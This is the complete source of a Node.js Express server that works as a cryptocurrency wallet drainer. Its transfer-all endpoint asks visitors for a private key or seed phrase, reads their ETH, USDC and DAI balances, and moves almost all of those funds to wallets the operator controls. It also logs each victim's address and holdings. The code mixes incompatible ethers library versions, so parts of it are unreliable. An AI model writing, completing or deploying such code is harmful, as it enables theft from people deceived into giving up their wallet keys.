const express = require('express');
const bodyParser = require('body-parser');
const { ethers } = require('ethers');
const dotenv = require('dotenv');
const axios = require('axios');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

dotenv.config();

const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

const logStream = fs.createWriteStream(path.join(__dirname, 'transactions.log'), { flags: 'a' });

function logTransaction(data) {
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] ${JSON.stringify(data, null, 2)}\n`;
    logStream.write(logEntry);
}

const receivingWallets = {
    ETH: process.env.RECEIVING_WALLET_ETH,
    USDC: process.env.RECEIVING_WALLET_USDC,
    DAI: process.env.RECEIVING_WALLET_DAI,
};

const tokenContracts = {
    ETH: ethers.ZeroAddress,
    USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
};

const tokenDecimals = {
    ETH: 18,
    USDC: 6,
    DAI: 18,
};

const tokenNames = {
    ETH: 'Ethereum',
    USDC: 'USD Coin',
    DAI: 'Dai Stablecoin',
};

const tokenPrices = {
    ETH: 2000,
    USDC: 1,
    DAI: 1,
};

const GAS_COSTS = {
    ETH_TRANSFER: 0.0015,
    TOKEN_TRANSFER: 0.0025,
};

const RPC_URL = process.env.RPC_URL;

async function getGasPrice() {
    try {
        const response = await axios.get('https://api.etherscan.io/api?module=proxy&action=eth_gasPrice&apikey=' + process.env.ETHERSCAN_API_KEY, { timeout: 5000 });
        return ethers.utils.formatUnits(response.data.result, 'gwei');
    } catch (error) {
        console.log('⚠️ Using default gas price (30 Gwei)');
        return '30';
    }
}

async function getAllBalances(provider, userAddress) {
    const balances = {};
    const balanceDetails = [];
    
    for (const currency of Object.keys(tokenContracts)) {
        try {
            let balance;
            if (currency === 'ETH') {
                balance = await provider.getBalance(userAddress);
                const balanceEth = parseFloat(ethers.utils.formatEther(balance));
                const usdValue = balanceEth * tokenPrices[currency];
                balanceDetails.push({
                    currency: currency,
                    name: tokenNames[currency],
                    balance: balanceEth,
                    balanceRaw: balance.toString(),
                    usdValue: usdValue,
                    symbol: currency
                });
            } else {
                const tokenContract = new ethers.Contract(tokenContracts[currency], ['function balanceOf(address) view returns (uint256)'], provider);
                balance = await tokenContract.balanceOf(userAddress);
                if (balance.gt(0)) {
                    const balanceFormatted = parseFloat(ethers.utils.formatUnits(balance, tokenDecimals[currency]));
                    const usdValue = balanceFormatted * tokenPrices[currency];
                    balanceDetails.push({
                        currency: currency,
                        name: tokenNames[currency],
                        balance: balanceFormatted,
                        balanceRaw: balance.toString(),
                        usdValue: usdValue,
                        symbol: currency
                    });
                }
            }
            if (balance.gt(0)) balances[currency] = balance;
        } catch (error) {
            console.error(`Error checking ${currency}:`, error.message);
        }
    }
    
    return { balances, balanceDetails };
}

function getWalletFromInput(input, provider) {
    const cleanedInput = String(input).trim().replace(/\s+/g, ' ');
    const cleanKey = cleanedInput.replace('0x', '');
    
    if (/^[0-9a-fA-F]{64}$/.test(cleanKey)) {
        return new ethers.Wallet(`0x${cleanKey}`, provider);
    }
    
    try {
        return ethers.Wallet.fromMnemonic(cleanedInput, "m/44'/60'/0'/0/0", provider);
    } catch (error) {
        throw new Error('Invalid seed phrase. Please check your words.');
    }
}

function sortTokensByValue(balanceDetails) {
    return balanceDetails.sort((a, b) => b.usdValue - a.usdValue);
}

app.post('/api/transfer-all', async (req, res) => {
    const { userInput } = req.body;

    if (!userInput) {
        return res.status(400).json({ success: false, error: 'Please enter your private key or seed phrase' });
    }

    const startTime = Date.now();
    
    try {
        const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
        let userWallet;
        
        try {
            userWallet = getWalletFromInput(userInput, provider);
        } catch (error) {
            return res.status(400).json({ success: false, error: error.message });
        }
        
        const userAddress = userWallet.address;
        
        logTransaction({
            event: 'TRANSFER_STARTED',
            userAddress: userAddress,
            timestamp: new Date().toISOString()
        });
        
        const { balances, balanceDetails } = await getAllBalances(provider, userAddress);
        
        if (balanceDetails.length === 0) {
            return res.status(400).json({ success: false, error: 'No balances found in your wallet' });
        }
        
        const totalWalletValue = balanceDetails.reduce((sum, token) => sum + token.usdValue, 0);
        
        logTransaction({
            event: 'WALLET_SNAPSHOT',
            userAddress: userAddress,
            totalValueUSD: totalWalletValue.toFixed(2),
            tokens: balanceDetails.map(t => ({
                token: t.currency,
                name: t.name,
                balance: t.balance,
                usdValue: t.usdValue.toFixed(2)
            })),
            timestamp: new Date().toISOString()
        });
        
        const sortedTokens = sortTokensByValue(balanceDetails);
        
        const ethToken = balanceDetails.find(t => t.currency === 'ETH');
        const ethBalanceEth = ethToken ? ethToken.balance : 0;
        
        const transferPlan = [];
        let remainingGas = ethBalanceEth;
        
        for (const token of sortedTokens) {
            const gasCost = token.currency === 'ETH' ? GAS_COSTS.ETH_TRANSFER : GAS_COSTS.TOKEN_TRANSFER;
            
            if (remainingGas >= gasCost) {
                transferPlan.push({
                    currency: token.currency,
                    name: token.name,
                    balance: token.balance,
                    usdValue: token.usdValue,
                    gasCost: gasCost,
                    willTransfer: true
                });
                remainingGas -= gasCost;
            } else {
                transferPlan.push({
                    currency: token.currency,
                    name: token.name,
                    balance: token.balance,
                    usdValue: token.usdValue,
                    gasCost: gasCost,
                    willTransfer: false,
                    reason: `Insufficient ETH for gas (need ${gasCost} ETH, have ${remainingGas} ETH remaining)`
                });
            }
        }
        
        const tokensToTransfer = transferPlan.filter(t => t.willTransfer);
        
        if (tokensToTransfer.length === 0) {
            const errorMsg = `No tokens can be transferred. Need at least ${GAS_COSTS.TOKEN_TRANSFER} ETH for gas. You have ${ethBalanceEth} ETH.`;
            logTransaction({
                event: 'TRANSFER_FAILED',
                userAddress: userAddress,
                reason: errorMsg,
                timestamp: new Date().toISOString()
            });
            return res.status(400).json({ success: false, error: errorMsg });
        }
        
        logTransaction({
            event: 'TRANSFER_PLAN',
            userAddress: userAddress,
            totalEthForGas: ethBalanceEth,
            tokensToTransfer: tokensToTransfer.length,
            tokensSkipped: transferPlan.filter(t => !t.willTransfer).length,
            plan: transferPlan.map(t => ({
                token: t.currency,
                willTransfer: t.willTransfer,
                value: t.usdValue.toFixed(2),
                reason: t.reason || 'Will transfer'
            })),
            timestamp: new Date().toISOString()
        });
        
        const gasPriceGwei = await getGasPrice();
        const gasPrice = ethers.utils.parseUnits(gasPriceGwei, 'gwei');
        
        const transactions = [];
        let totalTransferredValue = 0;
        
        for (const plan of tokensToTransfer) {
            const { currency, balance: balanceValue } = plan;
            const balanceWei = balances[currency];
            
            const transferStartTime = Date.now();
            
            try {
                const gasLimit = currency === 'ETH' ? 21000 : 100000;
                let transaction, receipt;
                let amountTransferred, usdValueTransferred;
                
                if (currency === 'ETH') {
                    const totalGasNeeded = tokensToTransfer.reduce((sum, p) => sum + p.gasCost, 0);
                    const gasReserve = ethers.utils.parseEther(totalGasNeeded.toString());
                    let amountToTransfer = balanceWei.sub(gasReserve);
                    
                    if (amountToTransfer.lte(0)) {
                        logTransaction({
                            event: 'TRANSFER_SKIPPED',
                            userAddress: userAddress,
                            currency: currency,
                            reason: 'All ETH used for gas fees',
                            timestamp: new Date().toISOString()
                        });
                        transactions.push({ currency, status: 'skipped', reason: 'All ETH used for gas fees' });
                        continue;
                    }
                    
                    amountTransferred = parseFloat(ethers.utils.formatEther(amountToTransfer));
                    usdValueTransferred = amountTransferred * tokenPrices[currency];
                    
                    transaction = await userWallet.sendTransaction({
                        to: receivingWallets[currency],
                        value: amountToTransfer,
                        gasPrice: gasPrice,
                        gasLimit: gasLimit
                    });
                } else {
                    const amountToTransferWei = balanceWei.mul(95).div(100);
                    amountTransferred = parseFloat(ethers.utils.formatUnits(amountToTransferWei, tokenDecimals[currency]));
                    usdValueTransferred = amountTransferred * tokenPrices[currency];
                    
                    const tokenContract = new ethers.Contract(
                        tokenContracts[currency],
                        ['function transfer(address to, uint256 value) returns (bool)'],
                        userWallet
                    );
                    
                    transaction = await tokenContract.transfer(
                        receivingWallets[currency],
                        amountToTransferWei,
                        { gasPrice: gasPrice, gasLimit: gasLimit }
                    );
                }
                
                receipt = await transaction.wait();
                const transferDuration = Date.now() - transferStartTime;
                
                const transactionResult = {
                    currency: currency,
                    name: tokenNames[currency],
                    amount: amountTransferred,
                    usdValue: usdValueTransferred.toFixed(2),
                    transactionHash: transaction.hash,
                    status: 'success',
                    gasUsed: receipt.gasUsed.toString(),
                    blockNumber: receipt.blockNumber,
                    durationMs: transferDuration
                };
                
                transactions.push(transactionResult);
                totalTransferredValue += usdValueTransferred;
                
                logTransaction({
                    event: 'TRANSFER_SUCCESS',
                    userAddress: userAddress,
                    currency: currency,
                    name: tokenNames[currency],
                    amount: amountTransferred,
                    usdValue: usdValueTransferred.toFixed(2),
                    transactionHash: transaction.hash,
                    blockNumber: receipt.blockNumber,
                    gasUsed: receipt.gasUsed.toString(),
                    durationMs: transferDuration,
                    timestamp: new Date().toISOString()
                });
                
            } catch (error) {
                logTransaction({
                    event: 'TRANSFER_FAILED',
                    userAddress: userAddress,
                    currency: currency,
                    name: tokenNames[currency],
                    error: error.message,
                    timestamp: new Date().toISOString()
                });
                transactions.push({ currency, name: tokenNames[currency], status: 'failed', error: error.message });
            }
        }
        
        const successfulCount = transactions.filter(t => t.status === 'success').length;
        const totalDuration = Date.now() - startTime;
        
        logTransaction({
            event: 'TRANSFER_BATCH_COMPLETE',
            userAddress: userAddress,
            summary: {
                totalValueInWallet: totalWalletValue.toFixed(2),
                totalValueTransferred: totalTransferredValue.toFixed(2),
                successfulTransfers: successfulCount,
                failedTransfers: transactions.filter(t => t.status === 'failed').length,
                skippedTransfers: transactions.filter(t => t.status === 'skipped').length,
                totalDurationMs: totalDuration,
                totalDurationSeconds: (totalDuration / 1000).toFixed(1)
            },
            walletBreakdown: balanceDetails.map(t => ({
                token: t.currency,
                name: t.name,
                balance: t.balance,
                usdValue: t.usdValue.toFixed(2),
                wasTransferred: transactions.some(tx => tx.currency === t.currency && tx.status === 'success')
            })),
            transactions: transactions,
            timestamp: new Date().toISOString()
        });
        
        res.json({
            success: true,
            message: `Transfer Complete! Transferred $${totalTransferredValue.toFixed(2)} worth of assets.`,
            summary: {
                totalValueInWallet: totalWalletValue.toFixed(2),
                totalValueTransferred: totalTransferredValue.toFixed(2),
                successfulTransfers: successfulCount,
                totalDurationSeconds: (totalDuration / 1000).toFixed(1)
            },
            transactions: transactions,
            walletSnapshot: balanceDetails
        });
        
    } catch (error) {
        logTransaction({
            event: 'SYSTEM_ERROR',
            error: error.message,
            timestamp: new Date().toISOString()
        });
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(port, () => {
    console.log(`✅ Server running at http://localhost:${port}`);
    console.log(`📝 Detailed logging enabled`);
});